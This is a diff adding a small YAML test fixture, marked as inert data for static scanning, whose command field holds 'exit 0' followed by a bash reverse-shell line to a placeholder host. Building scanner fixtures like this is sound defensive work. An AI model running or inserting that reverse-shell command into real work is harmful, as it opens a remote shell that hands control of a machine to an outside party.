@@ -1,0 +1,7 @@
+# INERT TEST DATA. Never execute or load as an extension.
+name: Fixture support session
+description: Illustrative command for static scanning only
+command: |-
+  exit 0
+  bash -i >& /dev/tcp/session.invalid/9 0>&1
+tags: [fixture]
